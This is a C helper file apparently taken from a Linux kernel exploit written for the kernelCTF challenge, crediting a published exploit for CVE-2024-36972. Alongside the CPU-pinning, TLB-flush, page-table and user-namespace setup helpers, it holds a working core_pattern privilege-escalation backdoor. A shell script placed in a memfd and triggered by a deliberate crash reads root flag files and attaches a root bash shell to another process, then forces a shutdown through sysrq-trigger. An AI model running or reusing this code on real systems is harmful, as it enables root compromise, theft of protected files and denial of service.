#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// log
#define LOG(fmt, ...) printf("[%s] " fmt "\n", __func__, ##__VA_ARGS__)

// utils
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;
#define PAGE_SIZE 0x1000

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1) {                                              \
      fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno));          \
      exit(1);                                                                 \
    }                                                                          \
    __res;                                                                     \
  })
#define rep_(i, a_, b_, a, b, ...)                                             \
  for (int i = (a), i##_len = (b); i < i##_len; ++i)
#define rep(i, ...) rep_(i, __VA_ARGS__, __VA_ARGS__, 0, __VA_ARGS__)
static void assign_to_core(int core_id) { cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  SYSCHK(sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
}

static void thread_assign_to_core(int core_id) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  SYSCHK(pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset));
}

// LPE
// codes from starlabs' exploit
// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-36972_lts_cos/docs/exploit.md#post-rip
#define CORE_PATTERN_MEMFD "|/proc/%P/fd/777"
#define LPE_BILLY                                                              \
  "#!/bin/sh\nPID=`pidof billy`\n"                                             \
  "/bin/cat /flag* /root/flag* >/proc/$PID/fd/1\n"                             \
  "/bin/bash >/proc/$PID/fd/1 </proc/$PID/fd/0 2>&1\n"                         \
  "echo o > /proc/sysrq-trigger"

static void init_billy(char **argv) {
  if (fork() == 0) {
    assign_to_core(1);
    strcpy(argv[0], "billy");
    sleep(99999);
  }
}

static void core_pattern_win_memfd(const char *backdoor_cmd) {
  if (!fork()) {
    puts("[*] win!!");
    int fd = memfd_create("", 0);
    SYSCHK(write(fd, backdoor_cmd, strlen(backdoor_cmd) + 1));
    dup2(fd, 777);
    close(fd);
    *(u8 *)0 = 0;
  }
  sleep(9999);
}

// VIRT
#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30)
#define PGD2V(i) ((unsigned long long)(i) << 39)

#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff)
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)

#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index)    \
  ((void *)(PGD2V((unsigned long long)(pgd_index)) +                           \
            PUD2V((unsigned long long)(pud_index)) +                           \
            PMD2V((unsigned long long)(pmd_index)) +                           \
            PTE2V((unsigned long long)(pte_index)) +                           \
            (unsigned long long)(byte_index)))
#define USER_PAGETABLE(phys_addr) ((u64)phys_addr | 0x67 | (1ul << 63))

static void flush_tlb() {
  short *status;
  void *addr;
  const int len = 0x1000;

  status = (short *)mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  addr = (short *)mmap(NULL, len, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);

  *status = 0;
  if (!fork()) {
    munmap(addr, len);
    *status = 1;
    sleep(9999);
  }

  while (*status == 0)
    ;

  munmap(status, sizeof(short));
}

static void unshare_setup() {
  u32 uid = getuid(), gid = getgid();
  int temp, ret;
  char edit[0x100];
  SYSCHK(unshare(CLONE_NEWNET | CLONE_NEWUSER));
  temp = SYSCHK(open("/proc/self/setgroups", O_WRONLY));
  SYSCHK(write(temp, "deny", strlen("deny")));
  SYSCHK(close(temp));
  temp = SYSCHK(open("/proc/self/uid_map", O_WRONLY));
  snprintf(edit, sizeof(edit), "0 %d 1", uid);
  SYSCHK(write(temp, edit, strlen(edit)));
  SYSCHK(close(temp));
  temp = SYSCHK(open("/proc/self/gid_map", O_WRONLY));
  snprintf(edit, sizeof(edit), "0 %d 1", gid);
  SYSCHK(write(temp, edit, strlen(edit)));
  SYSCHK(close(temp));

  return;
}
